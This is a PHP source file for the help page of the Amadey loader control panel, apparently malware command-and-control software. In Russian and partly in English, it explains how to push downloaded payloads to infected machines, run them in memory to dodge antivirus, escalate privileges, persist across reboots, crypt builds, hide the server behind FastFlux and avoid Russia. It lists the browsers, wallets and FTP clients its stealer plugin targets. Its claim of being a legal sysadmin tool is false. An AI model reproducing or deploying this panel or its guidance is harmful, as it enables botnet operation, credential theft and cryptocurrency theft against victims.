<?php
    
   session_start();

   if (!(isset($_SESSION['Name'])))
   {
      header("Location: Login.php");
      exit;
   }

   include("Header.php");
   include("Functions.php");
   include("Cfg/Config.php");
   include("Cfg/Options.php");
   include("Cfg/Lang.php");

   echo "<table cellpadding=0 cellspacing=0 width=\"100%\" style =\"border: 0px solid;\">
         <tr style=background-color:#11101d; height=\"50\">
            <td>
               <div align = center>
                  <font color=\"#E4E9F7\">" . $_SESSION['Name'] . $CCount . $lang["_012"].
                  "</font>
               </div>
            </td>
         </tr>
         <tr>
            <td>
               <img src=\"Images\Ang.png\" align=\"top\"></img>
            </td>
         </tr>
      </table>";
   
 

   If ($options["language"] == "Ru")
   {

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.1</b> Что это такое?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Вы находитесь в панели управления лоадером <b>Amadey</b>! Это профессиональный иструмент для системных администраторов, позволяющий удаленно устанавливать софт в компьютерных сетях любого уровня. Если Вы новичек - пожалуйста потратьте время на изучение этого раздела перед началом работы.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.2</b> Программа легитимна?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr> 
                     <td>Лоадер <b>Amadey</b> не приносит вред или урон ПК, ОС, пользователю ПК. Не является вредоносной программой, не нарушает УК РФ и других стран. Однако некоторые пользователи используют лоадер для распространения вредоносного софта, по этому антивирусные программы могут пытаться превентивно блокировать работу лоадера. Далее мы будем называть это <b>детект</b></td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.3</b> С чего начать новичку?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>При запуске <b>a.exe</b> на ПК вы сможете видеть этот ПК в разделе <a href=\"Show_Units.php?show=all\">Юниты</a>. Вы можете получить всю информацию о ПК, актуальный скриншот экрана, а так управлять этим ПК и другими.</td>
                  </tr>
               </table>";
 
      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.4</b> Что такое Уид?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Уид это уникальный номер ПК, на котором установлен лоадер - он разный для каждого ПК.</td>
                  </tr>
               </table>";
 
      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.5</b> Что такое Сид?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Сид это уникальный номер exe лоадера (билда). Не важно на каком ПК будет работать лоадер, Сид всегда будет один. У другого ехе (билда) будет уже другой Сид. Вы можете видеть Сид, а так же давать задания с учетом Сид, тем самым разделяя потоки трафика.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.6</b> Как создать задание?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Перейдите в раздел <a href=\"Make_Task.php\">Создать задачу</a>. Укажите прямую ссылку на файл (файл должен скачиваться без авторизации), при необходимости Уид и Сид юнитов, которые должны выполнить задание, а так же установите нужный лимит. Сохраните.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.7</b> Что такое лимит задания?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Лимит это максимальное количество загрузок по этому заданию. Когда лимит будет достигнут выполнение задания будет остановлено. Если у вас недостаточно юнитов онлайн для выполнения задания - выполнение будет продолжено потом, когда новые юниты появятся онлайн.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.8</b> Как указать страны для выполнения задания?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Для выполнения задания во всех странах просто оставьте символ *, если нужно указать какую-то конкретную страну или страны сделайте это через пробел и запятую используя индексы. Например укажите <b>NP, PE, LK, CZ</b> для Непала, Перу, Шри Ланки и Чехии. Таблицу индексов можно взять <a href=\"F.st/c.index.txt\">тут</a>.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.9</b> Как указать архитектуру?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Для загрузки задания по ПК с любой архитетурой оставьте символ *. Если нужно прогружать только на <b>х64</b> или только на <b>х32</b> - вы можете это сделать.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.0</b> Какие типы задач бывают?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td><div>Классическое сохранение <b>exe</b> файла на диск с последующим запуском является оптимальным для большинства задач.</div>
                         <div>Запуск <b>exe</b> в памяти подходит только для exe без зависмостей, за то он может помочь обойти некоторые детекты (используйте только если точно знайте что делайте).<div>
                         <div>Запуск <b>dll</b> потребует от вас так же указать имя функции, которое нужно вызвать из dll (максимальная длина имени 18).<div>
                         <div>Запуск <b>cmd</b> позволит вам скачать и выполнить cmd или bat файл.<div>
                         <div><b>Самоудаление</b> удалит лоадер с ПК, после получения задания он выключится, а после рестарта ОС будет удален физически.<div></td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.1</b> Куда сохраниться файл?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>В данный момент доступно несколько вариантов директорий для сохранения файла на локальном ПК. Принципиально они ничем не отличаются, вы можете выбрать любой. По умолчанию используется %tmp%. Имя файла будет взято из ссылки, так же каждый файл будет сохранен в подпапку с уникальным именем.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.2</b> Стоит ли повышать привилегии?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Если загружаемый ехе работает только с правами авдминистратора или требует повышеных привилегий вы можете выбрать \"Повышенные привилегии\" при создании задания. Тогда файл будет запущен от имени администратора. Обратите внимание, что при этом на ПК, работающих под учетной записью с правами пользователя, выскочит запрос пароля администратора.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.3</b> Можно создать несколько заданий?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Да, конечно.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.3</b> Юнит выполнит задание повторно?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Нет, каждое задание выдается каждому юниту лишь один раз.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.4</b> Что нам дает статистика?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>В разделе <a href=\"Show_Tasks.php\">Задачи</a> вы можете видеть статистику выполнения по каждой задаче. Ошибка загрузки означатет, что файл не был скачан, обычно это из-за неправильной ссылки. Ошибка запуска - возможно файл блокирован антивирусом или не работоспособен на этой ОС. Статус успех означает успешное выполнение задачи юнитом.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.5</b> Загружаемые файлы будут работать после перезагрузки?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Exe и dll файлы ставятся на автозагрузку и продолжат работать после рестарта ПК даже если лоадер будет удален с ПК. Не отностится к cmd файлам и exe, которые были запущены в памяти.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.6</b> Поддерживается FastFlux?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Да, панель управления лоадером может работать через FastFlux и другие системы скрытия сервера.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.7</b> Как обновить установленный лоадер?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Обновление лоадера не предусмотрено. Попытка загрузить новый билд лоадера не окончится успехом. Если вам кажется, что это глупо и неудобно - просто поверьте, так лучше.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.8</b> Поддерживается ли SSL (https)?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Нет, secure http не поддерживается. У лоадера есть встроенное шифрование трафика RC4 с уникальным для каждого клиента ключем, которое решает вопрос безопасности данных и не влияет на показатели отстука.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.9</b> Сколько url панели управления поддерживает лоадер?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Одновременно три. Все работают паралельно в три потока, задания выполняются из любого.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.0</b> Как заказать новый билд?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Минимально необходимая информация это url. Он может содержать как домен, так и IP адрес. Если вы не указываейте подпапку - она будет генерирована автоматически случайным образом. Адресов может быть от одного до трех. При создании билда вы можете отключить такие опции как автозапуск, копирование в систему, скриншоты и плагины. Если вы хотите заказать новый билд для уже существующей панели управления - обязательно укажите подпапку, иначе она будет рандомной и билд работать не будет. Если вы ошиблись в заявке на создание билда - нужно будет делать новый билд. Платно.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.1</b> Нужно ли криптовать билд?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Необходимости в этом нет, но это поможет сделать работу более эффективной. Так же есть смысл криптовать плагин Plugins/Cred.dll</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.2</b> Можно ли работать без крипта?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Да.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.3</b> Какой крипт сервис выбрать? Рекомендации.</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Вы можете выбрать любой сервис, вся ответственность за его работу исключительно на нем. Никаких рекомендаций по выбору нет и быть не может (за это предусмотрена ответственность).</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.4</b> Как тестировать после крипта?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Рекомендуется лично проверять работоспособность после каждого крипта на виртуальных машинах. Как минимум отстук и выполнения задания с контролем результата на декстопных и серверных ОС.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.5</b> Работает ли лоадер на виртуальных машинах?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Да, работает. Нет никаких механизмов АнтиВМ.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.6</b> Какие требования к серверу?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Рекомендуется: ОС Ubuntu 20.04 или 22.04, php7, MySQL или MariaDB, Nginx. 2 или более ядер процессора, 4 или более гигабайт ОЗУ, SSD диск.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.7</b> Что делать если сервер тормозит или часто выдает ошибки серии 500?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Установить Nginx вместо Apache, если это не помогло обратиться к хостеру.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.8</b> Какие детекты у файла?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Единственный способ это проверить - взять последний билд и отправить на чекер. Вы можете сделать это лично. Саппорт лоадера не проверяет билд раз в пять минут, не имеет последнего скана, не будет это делать по запросу.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.9</b> Что делать если нет отстука?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Проверьте доступ к интернету (в частности к вашей панели) с тестового стенда. Отключить фаерволл и антивирус если понадобиться. Если на ПК уже была запущена другая копия лоадера - нужно удалить её предварительно. Если нет отстука от криптованного файла, скорее всего он поврежден во время крипта.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.3.0</b> В каких регионах лоадер не работает?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Отстук работает в любом регионе, выполнение заданий в любом регионе кроме Российской Федерации.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.3.1</b> Как подготовить сервер к установке панели лоадера и установить её?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>На примере чистой <b>Ubuntu 20.04</b>:
                     <div>● Обновите сервер командами <b>sudo apt-get update</b> и <b>sudo apt-get upgrade -y</b></div>
                     <div>● Установите php fpm командой <b>sudo apt install php-fpm php-mysql -y</b>, для этой версии ОС дефолтная версия 7.4</div>
                     <div>● Установите MySQL сервер командой <b>sudo apt install mysql-server -y</b></div>
                     <div>● Создайте БД и пользователя выполнив:</div>
                     <div>&nbsp;</div>
                     <div><b>sudo mysql</b></div>
                     <div><b>ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password by 'you-password-here';</b></div>
                     <div><b>CREATE DATABASE newdb DEFAULT CHARACTER SET utf8 DEFAULT COLLATE utf8_general_ci;</b></div>
                     <div><b>CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'newpassword';</b></div>
                     <div><b>GRANT ALL PRIVILEGES ON *.* TO 'newuser'@'localhost' WITH GRANT OPTION;</b></div>

                     <div><b>exit</b></div>
                     <div>&nbsp;</div>

                     <div>● Установите nginx командой <b>sudo apt install nginx -y</b></div>
                     <div>● Отредактируйте конфиг командой <b>sudo nano /etc/nginx/sites-available/web</b>, чтобы он выгялядел так:</div>
                     <div>&nbsp;</div>
                     <div><b>server {</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;listen 80;</p></div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root /var/www/html;</p></div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;index index.php index.html index.htm index.nginx-debian.html;</p></div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server_name example.com;</p></div>
                     <div>&nbsp;</div>
                     <div>&nbsp;&nbsp;&nbsp&nbsp;&nbsp;&nbsp;location / {</p></div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try_files $uri $uri/ =404;</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</div>
                     <div>&nbsp;</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;location ~ \.php$ {</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;include snippets/fastcgi-php.conf;</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</div>
                     <div>&nbsp;</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;location ~ /\.ht {</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;deny all;</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</div>
                     <div>}</b></div>
                     <div>&nbsp;</div>
                     <div>● Выполните: <b>sudo ln -s /etc/nginx/sites-available/web /etc/nginx/sites-enabled/</b></div>
                     <div>и: <b>sudo unlink /etc/nginx/sites-enabled/default</b>, чтобы сделать сайт дефолтным</div>
                     <div>● Перезапустите nginx: <b>sudo systemctl reload nginx</b></div>
                     <div>● Загрузите файлы панели в: <b>/var/www/html/имя подпапки/</b> используя любой sFTP клиент, например <b>WinSCP</b></div>
                     <div>● Авторизуйтесь в панели через WEB интерфейс и задайте в настройках данные от БД, в нашем случае имя <b>newdb</b>, имя юзера <b>newuser</b>, пароль <b>newpassword</b></div>
                     <div>● Создайте таблицы в БД, для этого нажмите кнопку \"Создать таблицы в базе данных: \" на странице настроек</div>
                     <div>● Выставьте chmod 777 на каталоги <b>/Screens</b>, <b>/Sessions</b>, <b>/Credentials</b> и 646 на файлы <b>/Cfg/Config.php</b> и <b>/Cfg/Options.php</b></div></td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.3.2</b> Для чего учетная запись наблюдателя?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Учетная запись наблюдатель не имеет возможности создавать и редактировать задания, а также менять настройки. Вы можете дать её кому-то для просмотра статистики.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.3.3</b> Для чего ссылка на статистику по задаче?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>У каждой задачи есть ссылка на статистику, которая видна без авторизации. Вы можете делится с кем-либо этой информацией через ссылку.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.3.4</b> Какой софт поддерживается плагином стилер?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Chrome based, Firefox based, Exodus, Electrum, Armory, DogeCoin, LiteCoin, Monero, FileZilla, Pidgin...</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();
      sTable();
      sTable(); 
   }

   If ($options["language"] == "En")
   {

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.1</b> That is it?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>You are in <b>Amadey</b> loader control panel! This is a professional tool for system administrators that allows you to remotely install software in computer networks of any level. If you are a beginner, please take the time to study this section before starting work.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.2</b> Is the program legal?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr> 
                     <td>Loader <b>Amadey</b> does not harm or damage the PC, OS, PC user. It is not a malicious program, does not violate the Criminal Code of the Russian Federation and other countries. However, some users use the loader to distribute malicious software, so antivirus program may try to prevent the loader from working. Next we will call it <b>detect</b>.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.3</b> Where should a beginner start?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>At startup <b>a.exe </b> on a PC, you can see this PC in the section <a href=\"Show_Units.php?show=all\">Units</a>. You can get all the information about the PC, actual screenshot of the screen, as well as manage this PC and others.</td>
                  </tr>
               </table>";
 
      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.4</b> That is Uid?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Uid is a unique number of the PC on which the loader is installed - it is different for each PC.</td>
                  </tr>
               </table>";
 
      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.5</b> That is Sid?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>The Sid is the unique number of the exe loader (build). It does not matter on which PC the loader will work, there will always be one Sid. Another exe (build) will have a different Sid. You can see the Sid, as well as give tasks taking into account the Sid, thereby dividing the traffic flows.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.6</b> How create a task?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Go to <a href=\"Make_Task.php \">Create a task</a>. Specify a direct link to the file (the file must be downloaded without authorization), if necessary, the Uid and Sid of the units that must complete the task, as well as set the desired limit. Save.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.7</b> What is the task limit?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>The limit is the maximum number of downloads for this task. When the limit is reached, the task execution will be stopped. If you don't have enough units online to complete the task, the execution will continue later when new units appear online.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.8</b> How specify the countries to complete the task?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>To complete the task in all countries, just leave the * symbol, if you need to specify a specific country or countries, do it separated by a space and a comma using indexes. For example, specify <b>NP, PE, LK, CZ</b> for Nepal, Peru, Sri Lanka and the Czech Republic. The index table can be taken <a href=\"F.st/c.index.txt \">here</a>.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.0.9</b> How set specify the architecture?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>To load a task on a PC with any architecture, leave the * symbol. If you need to upload only to <b>x64</b> or only to <b>x32</b> - you can do it.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

